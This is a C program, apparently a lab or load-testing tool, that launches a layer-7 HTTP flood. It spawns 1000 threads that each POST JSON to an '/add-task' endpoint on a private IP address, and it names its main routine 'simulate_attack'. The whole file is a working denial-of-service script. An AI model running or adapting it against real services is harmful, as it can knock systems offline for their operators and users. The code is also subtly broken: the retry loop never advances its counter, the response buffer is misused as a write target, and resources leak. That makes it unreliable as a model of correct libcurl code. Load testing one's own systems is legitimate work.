#define _POSIX_C_SOURCE 199309L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <time.h>

#define NUMBER_OF_REQUESTS 1000
#define LOG_FILE "./layer7_http_flood.log"
#define RESPONSE_BUFFER_SIZE 256

pthread_mutex_t log_mutex; // Mutex for thread-safe logging
FILE *log_file;            // Global log file pointer


void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "[%Y-%m-%d %H:%M:%S]", t);
}


// void write_log(const char *message) {
//     pthread_mutex_lock(&log_mutex); // Lock before writing to log
//     fprintf(log_file, "%s", message);
//     fflush(log_file);
//     pthread_mutex_unlock(&log_mutex);
// }


// size_t response_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
//     size_t total_size = size * nmemb;
//     strncat((char *)userdata, (char *)ptr, total_size);
//     return total_size;
// }


void *send_request(void *arg) {
    CURL *curl;
    CURLcode res;

    const char *url = "http://10.200.56.78/add-task";
    const char *data = "{\"task_name\": \"Test Task\", \"task_description\": \"This is a test task for load testing\"}";
    char response_buffer[RESPONSE_BUFFER_SIZE] = {0}; // Buffer for server response


    curl = curl_easy_init();
    if (curl) {
        char timestamp[30];
        char log_message[512];

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, (struct curl_slist *)curl_slist_append(NULL, "Content-Type: application/json"));
        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
        // curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, response_callback); // Capture response
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer); 
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
        curl_easy_setopt(curl, CURLOPT_STDERR, fopen("/dev/null", "w"));
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 3L);

        int tries = 1;
        res = curl_easy_perform(curl);

        while (res != CURLE_OK && tries < 3) {
            res = curl_easy_perform(curl);
        }

        get_timestamp(timestamp, sizeof(timestamp));

        if (res != CURLE_OK) {
            snprintf(log_message, sizeof(log_message), "%s Error: %s\n", timestamp, curl_easy_strerror(res));
        } 
        else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            snprintf(log_message, sizeof(log_message), "%s %ld %s", timestamp, response_code, response_buffer);
        }

        // write_log(log_message);
        curl_easy_cleanup(curl);
    }

    return NULL;
}

void simulate_attack() {
    pthread_t threads[NUMBER_OF_REQUESTS];

    for (int i = 0; i < NUMBER_OF_REQUESTS; i++) {
        if (pthread_create(&threads[i], NULL, send_request, NULL) != 0) {
            perror("Error creating thread");
        }
    }

    for (int i = 0; i < NUMBER_OF_REQUESTS; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("Done sending %d POST requests!\n", NUMBER_OF_REQUESTS);
}


int main() {
    struct timespec start, end;
    double cpu_time_used;

    clock_gettime(CLOCK_MONOTONIC, &start);

    pthread_mutex_init(&log_mutex, NULL);
    log_file = fopen(LOG_FILE, "a");

    if (!log_file) {
        perror("Error opening log file");
        return EXIT_FAILURE;
    }

    simulate_attack();

    fclose(log_file);
    pthread_mutex_destroy(&log_mutex);

    clock_gettime(CLOCK_MONOTONIC, &end);

    cpu_time_used = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    printf("Time taken: %.5f seconds\n", cpu_time_used);

    return 0;
}